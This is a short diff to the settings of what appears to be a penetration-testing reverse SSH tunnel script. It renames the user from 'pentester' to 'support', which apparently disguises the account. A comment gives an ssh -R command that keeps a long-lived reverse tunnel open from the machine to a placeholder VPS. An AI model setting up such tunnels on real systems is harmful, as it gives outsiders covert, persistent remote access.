@@ -13,7 +13,7 @@ LPORT = 5522
 SERVER="REMOTE-IP"
 RPORT = 22
 SLEEP = 5
-USER = "pentester"
+USER = "support"
 
 ### SSH Command: 
 # ssh -C -N -R 5544:localhost:22 -o ServerAliveInterval=60 -o ServerAliveCountMax=2592000 user-VPS@IP-VPS
